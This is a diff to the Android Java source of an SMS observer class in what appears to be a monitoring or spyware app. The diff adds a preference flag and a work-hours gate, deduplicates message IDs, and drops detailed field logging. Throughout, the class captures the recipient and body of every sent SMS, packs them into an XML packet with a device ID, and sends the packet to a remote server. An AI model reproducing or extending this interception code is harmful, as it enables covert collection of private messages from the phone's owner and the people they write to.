@@ -15,6 +15,7 @@ import android.util.Log;
 
 import com.inet.android.bs.FileLog;
 import com.inet.android.bs.Request;
+import com.inet.android.bs.WorkTimeDefiner;
 
 public class SmsSentObserver extends ContentObserver {
 
@@ -24,6 +25,7 @@ public class SmsSentObserver extends ContentObserver {
 	SharedPreferences sp;
 	private Context mContext;
 	Request req;
+	private static long id = 0;
 
 	public SmsSentObserver(Handler handler, Context ctx) {
 		super(handler);
@@ -37,6 +39,27 @@ public class SmsSentObserver extends ContentObserver {
 
 	public void onChange(boolean selfChange) {
 		dir = "исх. Sms";
+		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		String sms = sp.getString("KBD", "0");
+
+		if (sms.equals("0")) {
+			Log.d(TAG, "KBD = 0");
+			FileLog.writeLog("sms: KBD = 0");
+			return;
+		}
+
+		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
+		if (!isWork) {
+			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
+			Log.d(TAG, "after isWork retrun 0");
+			FileLog.writeLog("sms: isWork return " + Boolean.toString(isWork));
+			FileLog.writeLog("sms: after isWork retrun 0");
+
+			return;
+		} else {
+			Log.d(TAG, Boolean.toString(isWork));
+			FileLog.writeLog("sms out: " + Boolean.toString(isWork));
+		}
 
 		try {
 			Log.e(TAG, "Notification on SMS observer");
@@ -61,81 +84,51 @@ public class SmsSentObserver extends ContentObserver {
 						FileLog.writeLog("smsSentObserver: SMS Type : " + type);
 
 						if (type == 2) {
-							Log.e(TAG,
-									"Id : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("_id")));
-							Log.e(TAG,
-									"Thread Id : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("thread_id")));
-							Log.e(TAG,
-									"Address : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("address")));
-							Log.e(TAG,
-									"Person : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("person")));
-							Log.e(TAG,
-									"Date : "
-											+ sms_sent_cursor.getLong(sms_sent_cursor
-													.getColumnIndex("date")));
-							Log.e(TAG,
-									"Read : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("read")));
-							Log.e(TAG,
-									"Status : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("status")));
-							Log.e(TAG,
-									"Type : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("type")));
-							Log.e(TAG,
-									"Rep Path Present : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("reply_path_present")));
-							Log.e(TAG,
-									"Subject : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("subject")));
-							Log.e(TAG,
-									"Body : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("body")));
-							Log.e(TAG,
-									"Err Code : "
-											+ sms_sent_cursor.getString(sms_sent_cursor
-													.getColumnIndex("error_code")));
-							String sendStr = "<packet><id>"
-									+ sp.getString("ID", "ID")
-									+ "</id><time>"
-									+ logTime()
-									+ "</time><type>4</type><app>"
-									+ dir
-									+ "</app><ttl>"
-									+ sms_sent_cursor.getString(sms_sent_cursor
-											.getColumnIndex("address"))
-									+ "</ttl><cdata1>"
-									+ sms_sent_cursor.getString(sms_sent_cursor
-											.getColumnIndex("body"))
-									+ "</cdata1><ntime>" + "30"
-									+ "</ntime></packetSentObserver>";
+							long messageId = sms_sent_cursor
+									.getLong(sms_sent_cursor
+											.getColumnIndex("_id"));
+							// проверяем не обрабатывали ли мы это сообщение
+							// только-что
+							if (messageId != id) {
+								id = messageId;
+								int threadId = sms_sent_cursor
+										.getInt(sms_sent_cursor
+												.getColumnIndex("thread_id"));
+								Cursor c = mContext.getContentResolver().query(
+										Uri.parse("content://sms/outbox/"
+												+ threadId), null, null, null,
+										null);
+								c.moveToNext();
+								String sendStr = "<packet><id>"
+										+ sp.getString("ID", "ID")
+										+ "</id><time>"
+										+ logTime()
+										+ "</time><type>4</type><app>"
+										+ dir
+										+ "</app><ttl>"
+										+ sms_sent_cursor
+												.getString(sms_sent_cursor
+														.getColumnIndex("address"))
+										+ "</ttl><cdata1>"
+										+ sms_sent_cursor
+												.getString(sms_sent_cursor
+														.getColumnIndex("body"))
+										+ "</cdata1><ntime>" + "30"
+										+ "</ntime></packetSentObserver>";
 
-							req = new Request(mContext);
-							req.sendRequest(sendStr);
+								req = new Request(mContext);
+								req.sendRequest(sendStr);
 
-							Log.d(TAG, sendStr);
-							FileLog.writeLog("smsSentObserver: " + sendStr);
+								Log.d(TAG, sendStr);
+								FileLog.writeLog("smsSentObserver: " + sendStr);
 
-							/*
-							 * if(colNames != null){ for(int k=0;
-							 * k<colNames.length; k++){ Log.e(TAG,
-							 * "colNames["+k+"] : " + colNames[k]); } }
-							 */
-							sms_sent_cursor.close();
+								/*
+								 * if(colNames != null){ for(int k=0;
+								 * k<colNames.length; k++){ Log.e(TAG,
+								 * "colNames["+k+"] : " + colNames[k]); } }
+								 */
+								sms_sent_cursor.close();
+							}
 						}
 					}
 				}
